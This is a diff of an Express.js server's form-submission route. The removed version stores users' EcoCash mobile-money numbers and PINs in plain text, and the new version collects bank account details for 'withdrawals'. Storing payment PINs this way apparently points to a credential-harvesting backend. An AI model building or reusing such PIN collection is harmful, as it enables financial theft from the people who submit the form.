@@ -99,30 +99,39 @@ app.get("/save-test", async (req, res) => {
   }
 });
 app.post("/submit", async (req, res) => {
-console.log("SUBMIT ROUTE HIT");
-console.log(req.body);
   try {
 
-const { ecocash_number, ecocash_pin } = req.body;
+    const {
+      bank_name,
+      account_number,
+      branch_code,
+      phone_number
+    } = req.body;
 
-await pool.query(
-  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
-  [ecocash_number, ecocash_pin]
-);
+    await pool.query(
+      `INSERT INTO bank_withdrawals
+      (bank_name, account_number, branch_code, phone_number)
+      VALUES ($1, $2, $3, $4)`,
+      [
+        bank_name,
+        account_number,
+        branch_code,
+        phone_number
+      ]
+    );
 
-res.json({
-  success: true,
-  message: "Data saved successfully"
-});
+    res.json({
+      success: true,
+      message: "Withdrawal request submitted successfully"
+    });
 
-} catch (err) {
-
-res.status(500).json({
-  success: false,
-  error: err.message
-});
-
-}
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({
+      success: false,
+      message: err.toString()
+    });
+  }
 });
 
 app.get("/delete/:id", async (req, res) => {
